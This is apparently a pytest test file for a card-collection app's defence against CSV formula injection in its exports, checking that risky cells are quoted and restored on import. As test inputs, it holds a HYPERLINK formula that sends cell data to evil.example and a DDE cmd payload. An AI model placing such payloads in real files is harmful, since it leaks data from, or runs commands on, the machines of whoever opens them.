"""CSV formula injection in the collection exports (#351).

A card name, folder or note that starts with ``=``, ``+``, ``-``, ``@``, a tab or a carriage return is a formula when the
file is opened in a spreadsheet. The files other apps import (Moxfield, Archidekt, generic CSV) and the data export's
copies of them put one single quote in front of such a cell; the Dragon Shield export stays byte for byte what was
imported, and the Vault removes the quote again only where its own export put it (``vault/csv_safe.py``)."""

import csv
import io
import zipfile

import pytest
from sqlalchemy import select

from tests.test_api import DS_HEADER, V1, all_cards, upload
from vault import importer
from vault.csv_safe import TRIGGERS, neutralise_cell, neutralise_csv, restore_cell, restore_csv
from vault.models import Entry

HYPERLINK = '=HYPERLINK("https://evil.example/?"&A2,"click")'
# (card name, folder): every cell kind from the issue, a folder that is only ordinary data, and names that start with a quote
CELLS = [
    (HYPERLINK, "-- trade --"),
    ("+1 Mace", "+plus"),
    ("-1 Mace", "@binder"),
    ("@SUM(A1:A9)", "=folder"),
    ("'=quoted", "'-- quoted --"),   # really starts with a quote, then a formula character
    ("'Tis the Season", "'plain"),   # starts with a quote, then a letter: ordinary text
    ("Sol Ring", "plain"),
]
FORMULA_START = TRIGGERS


def ds_csv(cells=CELLS) -> bytes:
    out = io.StringIO()
    writer = csv.writer(out, lineterminator="\r\n")
    writer.writerows(csv.reader(io.StringIO(DS_HEADER)))
    for name, folder in cells:
        writer.writerow([folder, 1, 0, name, "C21", "Commander 2021", "263", "NearMint", "Foil", "English", "1.00", "2023-01-10", "1", "1", "1"])
    return out.getvalue().encode()


def cells_of(text: str) -> list[str]:
    return [c for row in csv.reader(io.StringIO(text, newline="")) for c in row]


def named(rows, column):
    return [row[column] for row in rows]


# -- the cell rule --------------------------------------------------------------------------------------

@pytest.mark.parametrize("cell,written", [
    (HYPERLINK, "'" + HYPERLINK),
    ("+1", "'+1"), ("-1", "'-1"), ("@SUM(A1)", "'@SUM(A1)"), ("\t=x", "'\t=x"), ("\r=x", "'\r=x"), ("=", "'="),
    ("-- trade --", "'-- trade --"),
    ("'=x", "''=x"), ("''-x", "'''-x"),          # a name that really starts with a quote still comes back
    ("'Tis", "'Tis"), ("Sol Ring", "Sol Ring"), ("a=b", "a=b"), ("", ""), ("'", "'"), (None, ""), (12, "12"),
])
def test_a_cell_that_could_be_a_formula_gets_one_quote_and_loses_it_on_the_way_back(cell, written):
    assert neutralise_cell(cell) == written
    assert restore_cell(written) == ("" if cell is None else str(cell))


def test_no_cell_is_a_formula_after_neutralising_and_every_one_comes_back():
    for first in FORMULA_START + ("'", "''"):
        for rest in ("", "x", "=", "'=", "-", "1+1"):
            cell = first + rest
            assert neutralise_cell(cell)[:1] not in FORMULA_START
            assert restore_cell(neutralise_cell(cell)) == cell


def test_a_file_without_formula_cells_is_not_touched_by_either_direction():
    text = "name,folder\r\nSol Ring,\"a, b\"\r\n'Tis the Season,x\r\n"
    assert neutralise_csv(text) == "name,folder\nSol Ring,\"a, b\"\n'Tis the Season,x\n"  # same cells, same quoting
    assert restore_csv(text) == text  # no marker: returned byte for byte


def test_an_excel_separator_line_and_other_delimiters_are_kept():
    text = "sep=;\nname;folder\n=1+1;\"a;b\"\n"
    safe = neutralise_csv(text)
    assert safe == "sep=;\nname;folder\n'=1+1;\"a;b\"\n"
    assert restore_csv(safe) == text


def test_a_cell_with_a_line_break_is_kept_in_one_piece():
    text = '"name","note"\n"=1+1","line one\n=not a formula"\n'
    assert cells_of(neutralise_csv(text)) == ["name", "note", "'=1+1", "line one\n=not a formula"]


def test_text_the_csv_reader_cannot_walk_is_left_to_the_importers_own_error():
    huge = "name\n" + '"' + "x" * (csv.field_size_limit() + 10) + '"\n'
    assert neutralise_csv(huge) == huge and restore_csv("'=" + huge) == "'=" + huge


# -- every export format --------------------------------------------------------------------------------

def exported(client, fmt):
    res = client.get(f"{V1}/collection/export/{fmt}")
    assert res.status_code == 200
    return res.text


@pytest.fixture
def formulas(signed_in):
    assert upload(signed_in, ds_csv()).status_code == 201
    return signed_in


@pytest.mark.parametrize("fmt,name_column,folder_column", [("moxfield", 2, 7), ("archidekt", 1, 7), ("csv", 2, 9)])
def test_the_files_other_apps_import_hold_no_formula(formulas, fmt, name_column, folder_column):
    text = exported(formulas, fmt)
    rows = list(csv.reader(io.StringIO(text, newline="")))[1:]
    names, folders = named(rows, name_column), named(rows, folder_column)
    assert "'" + HYPERLINK in names and "'+1 Mace" in names and "'-1 Mace" in names and "'@SUM(A1:A9)" in names
    assert "''=quoted" in names and "'Tis the Season" in names and "Sol Ring" in names  # a quote is only added where needed
    assert "'-- trade --" in folders and "'=folder" in folders and "'@binder" in folders and "'+plus" in folders
    assert "''-- quoted --" in folders and "'plain" in folders
    assert not [c for c in cells_of(text) if c[:1] in FORMULA_START]  # not one cell in the file starts like a formula


def test_the_dragon_shield_export_is_unchanged_and_still_round_trips_byte_for_byte(formulas):
    first = formulas.get(f"{V1}/collection/export.csv")
    cells = cells_of(first.text)
    assert HYPERLINK in cells and "-- trade --" in cells and "'=quoted" in cells and "=folder" in cells  # as imported
    assert "''=quoted" not in cells and "'" + HYPERLINK not in cells
    assert formulas.get(f"{V1}/collection/export/dragonshield").content == first.content
    assert upload(formulas, first.content).status_code in (200, 201)
    assert formulas.get(f"{V1}/collection/export.csv").content == first.content


def test_a_tab_or_carriage_return_at_the_start_is_defused_too(formulas, app):
    with app.state.db.sessions() as db:
        names = {"A": "\t=cmd|' /C calc'!A0", "B": "\r@SUM(1)"}
        for entry, name in zip(db.scalars(select(Entry).order_by(Entry.id)), names.values()):
            entry.name = name
        db.commit()
    for fmt, column in (("moxfield", 2), ("archidekt", 1), ("csv", 2)):
        text = exported(formulas, fmt)
        names = named(list(csv.reader(io.StringIO(text, newline="")))[1:], column)
        assert "'\t=cmd|' /C calc'!A0" in names and "'\r@SUM(1)" in names
        assert not [c for c in cells_of(text) if c[:1] in FORMULA_START]


def test_the_text_list_is_not_a_spreadsheet_and_is_unchanged(formulas):
    text = exported(formulas, "text")
    assert HYPERLINK in text and "'" + HYPERLINK not in text  # a line starting with the count; no cell to run


def test_the_data_export_neutralises_the_copies_other_apps_import(formulas):
    z = zipfile.ZipFile(io.BytesIO(formulas.get(f"{V1}/me/export").content))
    assert HYPERLINK in cells_of(z.read("collection.csv").decode())  # Dragon Shield: as imported
    for member in ("collection-moxfield.csv", "collection-generic.csv"):
        text = z.read(member).decode()
        assert "'" + HYPERLINK in cells_of(text) and not [c for c in cells_of(text) if c[:1] in FORMULA_START]


def test_an_export_of_one_bucket_is_defused_too(formulas):
    bucket = next(b for b in formulas.get(f"{V1}/collection/buckets").json()["items"] if b["name"] == "-- trade --")
    text = formulas.get(f"{V1}/collection/export/csv", params={"bucket": bucket["id"]}).text
    assert "'" + HYPERLINK in cells_of(text) and not [c for c in cells_of(text) if c[:1] in FORMULA_START]


# -- the way back ---------------------------------------------------------------------------------------

@pytest.mark.parametrize("fmt", ["moxfield", "csv"])
def test_the_vaults_own_export_comes_back_with_the_same_names_and_folders(formulas, fmt):
    original = importer.read_file(ds_csv())[1]
    source, entries = importer.read_file(exported(formulas, fmt).encode())
    assert source == fmt
    assert [e.name for e in entries] == [e.name for e in original]
    assert [e.folder for e in entries] == [e.folder for e in original]


@pytest.mark.parametrize("fmt", ["moxfield", "csv"])
def test_importing_the_export_back_changes_nothing_in_the_collection(formulas, fmt):
    before = sorted((c["name"], c["quantity"]) for c in all_cards(formulas))
    folders = sorted(b["name"] for b in formulas.get(f"{V1}/collection/buckets").json()["items"])
    res = upload(formulas, exported(formulas, fmt).encode())
    assert res.status_code in (200, 201), res.text
    assert sorted((c["name"], c["quantity"]) for c in all_cards(formulas)) == before
    assert sorted(b["name"] for b in formulas.get(f"{V1}/collection/buckets").json()["items"]) == folders
    assert ("'=quoted", 1) in before and (HYPERLINK, 1) in before  # the names are the person's, with no marker added


def test_a_file_from_elsewhere_keeps_its_cells_unless_they_carry_the_marker():
    """Only a quote in front of a formula character is removed; a Dragon Shield file is never rewritten."""
    mox = ("Count,Tradelist Count,Name,Edition,Condition,Language,Foil,Tags,Last Modified,Collector Number,Alter,Proxy,Purchase Price\n"
           "1,0,'=Mine,c21,Near Mint,English,,'-- x --,,263,False,False,\n"
           "1,0,'Tis the Season,c21,Near Mint,English,,tag,,263,False,False,\n"
           "1,0,=Hostile(),c21,Near Mint,English,,-- raw --,,263,False,False,\n")
    entries = importer.read_file(mox.encode())[1]
    assert [e.name for e in entries] == ["=Mine", "'Tis the Season", "=Hostile()"]
    assert [e.folder for e in entries] == ["-- x --", "tag", "-- raw --"]  # a hostile cell is stored as it came; the export defuses it
    ds = importer.read_file(ds_csv([("'=quoted", "'-- quoted --")]))[1]
    assert [(e.name, e.folder) for e in ds] == [("'=quoted", "'-- quoted --")]
